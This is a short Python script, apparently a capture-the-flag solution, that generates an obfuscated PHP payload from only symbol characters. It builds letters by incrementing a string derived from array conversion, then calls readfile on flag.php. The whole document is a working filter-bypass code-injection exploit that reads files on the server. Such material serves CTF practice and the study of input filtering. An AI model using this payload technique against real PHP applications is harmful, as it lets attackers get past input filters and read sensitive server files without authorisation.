init = '$_=[];$_="$_";$_=$_["."+"."];' # CREATES THE A

# $_ = A;
# $__ (2) = TEMPORARY

def encodeString(payload, variableName): # Payload is the string to be encoded, the variableName is generally '___' (a certain number of underscores)
    payload = payload.upper()

    ans = '$' + variableName + '="";' # Initializes the variable

    for c in payload:
        if c in '$()_[]=;+.': # If it is an allowed character it just concatenates it
            ans += '$' + variableName + '.="' + c + '";'

        else: # Otherwise it creates the letter starting from the 'A'
            offset = ord(c) - ord('A')
            ans += '$__=$_;'
            ans += '$__++;' * offset
            ans += '$' + variableName + '.=$__;'

    return ans

# $___ (3) = readfile
# $_____ (5) = FLAG.PHP

readfile = encodeString('readfile', '___')
fileName = encodeString('flag.php', '_____')

payload = init + \
        readfile + \
        fileName + \
        '$___($_____);'
   
print(payload)